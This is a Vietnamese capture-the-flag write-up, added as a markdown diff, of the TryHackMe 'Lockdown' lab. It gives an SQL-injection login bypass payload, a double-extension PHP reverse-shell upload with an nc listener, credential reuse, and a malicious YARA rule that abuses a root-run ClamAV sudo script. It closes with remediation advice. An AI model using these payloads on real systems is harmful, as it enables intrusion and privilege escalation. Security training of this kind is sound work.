@@ -1,0 +1,176 @@
+---
+title: 'Lockdown'
+description: 'A contact-tracing web app falls to admin login SQL injection and a disguised PHP upload, then a hardcoded MySQL password and a YARA-scanning sudo script finish the job as root.'
+date: 2025-12-03
+platform: tryhackme
+room: 'Lockdown'
+roomUrl: 'https://tryhackme.com/room/lockdown'
+difficulty: medium
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'file-upload'
+  - 'mysql'
+  - 'password-cracking'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'authentication bypass'
+  - 'unrestricted file upload'
+  - 'cleartext database credentials'
+  - 'password reuse'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Lockdown — SQL Injection Bỏ Qua Đăng Nhập Admin, Upload PHP Giả Dạng, và Script Sudo Quét YARA Dẫn Đến Root**
+
+_Bài viết tường thuật lại phòng "Lockdown" trên TryHackMe. Trang đăng nhập admin của một ứng dụng truy vết Covid sập trước một câu SQL injection một dòng, một chiêu đuôi file kép lách qua filter upload ảnh để nhồi vào một PHP reverse shell, một mật khẩu MySQL hardcode làm lộ thêm một credential, và một script quét antivirus chạy bằng sudo bị lợi dụng bằng một rule YARA tự viết để đọc flag root._
+
+> Các flag và credential đều đã được ẩn đi. Lockdown là một phòng lab được TryHackMe cho phép khai thác hợp pháp; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dưới dạng `<redacted>` là giá trị thật trên máy nhưng đã bị giữ lại, không công khai.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Trang đăng nhập admin của ứng dụng Coronavirus Contact Tracer bị lỗi **SQL injection bypass xác thực** → trường upload logo trong bảng quản trị chấp nhận một **file PHP giả dạng bằng đuôi kép** **`.png.php`** → PHP reverse shell với quyền `www-data` → một **mật khẩu MySQL hardcode** trong source của app mở khóa database → hash mật khẩu của admin bị bẻ khóa và **dùng lại (reuse)** cho một user hệ thống, `cyrus` → `cyrus` chạy được một script quét ClamAV bằng quyền root, script này xác định "virus" dựa trên **rule YARA lấy từ một thư mục database có thể ghi cho mọi người** → viết một rule YARA khớp với chuỗi `THM` khiến script quét cách ly (và đưa luôn cho chúng ta) flag root.
+
+Auth-bypass SQLi → upload file giả dạng → RCE → mật khẩu DB hardcode → hash bị bẻ khóa + reuse → lợi dụng rule YARA của một scanner chạy root → root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+Lockdown phục vụ một app PHP "Coronavirus Contact Tracer" ở cổng 80 cùng SSH ở cổng 22.
+
+### **Lỗ hổng: trang đăng nhập admin dựng query trực tiếp từ input thô**
+
+```text
+gobuster dir -u http://$IP/ -w directory-list-2.3-medium.txt
+# /admin /uploads /plugins /classes ...
+```
+
+<Callout type="insight">
+
+Trang đăng nhập admin tại `/admin/login.php` trả về đúng câu SQL query mà server đã chạy khi đăng nhập thất bại — một dấu hiệu mạnh cho thấy query được dựng bằng nối chuỗi thay vì tham số hóa.
+
+</Callout>
+
+### **Bước 1 — SQL injection bỏ qua đăng nhập admin**
+
+```text
+username: ' Or 1=1 -- -
+password: anything
+```
+
+Thao tác này đăng nhập chúng ta vào với quyền administrator của app mà không cần một credential hợp lệ nào.
+
+### **Bước 2 — đuôi file kép lách PHP shell qua filter upload**
+
+Bảng quản trị có tính năng upload logo chỉ kiểm tra đuôi file bề ngoài. Đổi tên một PHP reverse shell để kết thúc bằng `.png` trước, rồi gắn thêm `.php` phía sau, tạo ra một tên file mà filter chấp nhận như ảnh nhưng PHP vẫn thực thi:
+
+```text
+mv shell.php shell.php.png
+mv shell.php.png shell.png.php
+```
+
+Upload `shell.png.php` làm logo site rồi gọi trang hiển thị nó sẽ kích hoạt shell:
+
+```text
+nc -lvnp 4444
+# connect từ $IP → uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### **Bước 3 — mật khẩu MySQL hardcode giao luôn database**
+
+```text
+cat /var/www/html/classes/DBConnection.php
+# private $username = 'cts'; private $password = '<redacted>';
+mysql -u cts -p
+# use cts_db; select * from users;
+# admin | <redacted-hash>
+```
+
+### **Bước 4 — bẻ khóa và tái sử dụng mật khẩu admin**
+
+```text
+# Search That Hash / crackstation / john nhận diện + bẻ khóa hash
+# -> <redacted-password>
+su cyrus
+# password reuse: mật khẩu đã bẻ khóa của admin cũng dùng được cho user hệ thống cyrus
+cat /home/cyrus/user.txt   # -> THM{<redacted>}
+```
+
+### **Bước 5 — lợi dụng một lần quét ClamAV chạy root qua rule YARA tự viết**
+
+```text
+sudo -l
+# (root) /opt/scan/scan.sh
+cat /opt/scan/scan.sh
+# đọc một đường dẫn, sau đó: clamscan "$TARGET" --copy=/home/cyrus/quarantine
+```
+
+<Callout type="insight">
+
+ClamAV nạp database signature của nó, kể cả các rule YARA tùy chỉnh, từ một thư mục mà chính config của script chỉ thẳng cho chúng ta thấy. Nếu thư mục đó ghi được bởi user của chúng ta, chúng ta kiểm soát được những gì "antivirus" này coi là mối đe dọa — và vì vậy, kiểm soát được những gì nó copy ra cho chúng ta.
+
+</Callout>
+
+```text
+ls -la /var/lib/clamav   # ai cũng ghi được
+cat > /var/lib/clamav/rule.yar <<'EOF'
+rule PWNED
+{
+  strings:
+    $a = "root"
+    $b = "THM"
+  condition:
+    $a or $b
+}
+EOF
+sudo /opt/scan/scan.sh
+# Enter path: /root/root.txt
+# YARA.CheckFileName.UNOFFICIAL FOUND -> được copy vào /home/cyrus/quarantine/root.txt
+cat /home/cyrus/quarantine/root.txt   # -> THM{<redacted>}
+```
+
+### **Mức độ ảnh hưởng**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 9.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`). SQLi không cần xác thực dẫn tới root, hoàn toàn qua các lỗ hổng ở tầng logic ứng dụng mà nhìn riêng lẻ đều trông nhỏ:
+
+- **Bypass xác thực admin qua SQL injection** trao toàn quyền ứng dụng cho bất kỳ ai.
+- **Filter upload theo đuôi file** bị phá dễ dàng và dẫn thẳng tới remote code execution.
+- **Mật khẩu database hardcode trong source** và **password reuse giữa admin ứng dụng và một tài khoản hệ thống** biến một lỗi web-app thành một bàn đạp SSH.
+- **Một "trình quét bảo mật" chạy root lại tin tưởng một database rule có thể ghi được** đã lật ngược mục đích của chính nó thành một nguyên tố đọc file tùy ý.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Tham số hóa query đăng nhập** và hash mọi mật khẩu lưu trữ bằng bcrypt/argon2 — không bao giờ tự viết scheme riêng.
+2. **Kiểm tra file upload theo nội dung (magic byte / decode ảnh thật), không theo đuôi file**, và lưu file upload ngoài webroot hoặc tắt khả năng thực thi script trong thư mục upload.
+3. **Không bao giờ hardcode credential database**; dùng biến môi trường hoặc secrets manager, và xoay (rotate) mọi credential đã bị lộ qua bài tập này.
+4. **Khóa thư mục signature/rule của ClamAV chỉ cho root ghi**, và audit mọi rule `sudo` cho phép user không phải admin kích hoạt một lần quét có quyền cao trên một đường dẫn tùy ý.
+
+</Callout>
+
+### **Những điều rút ra**
+
+- **Thông báo lỗi lộ ra câu query là một oracle SQLi miễn phí.** Trang lỗi chung (generic) không phải là tùy chọn.
+- **Filter kiểu file theo đuôi file không phải là một biện pháp bảo mật.** Luôn kiểm tra theo nội dung.
+- **Password reuse giữa tài khoản ứng dụng và tài khoản hệ thống nối hai bề mặt tấn công "riêng biệt" thành một.**
+- **Một script phụ trợ có quyền cao chỉ đáng tin bằng đúng từng file nó đọc** — kể cả database signature của chính nó.
+
+Cảm ơn đã đọc. Lockdown là một ví dụ gọn gàng cho thấy vài lỗi nhỏ riêng lẻ — chẳng cái nào lạ — chồng lên nhau thành chiếm toàn quyền root khi không ai kiểm lại ranh giới tin cậy giữa chúng.
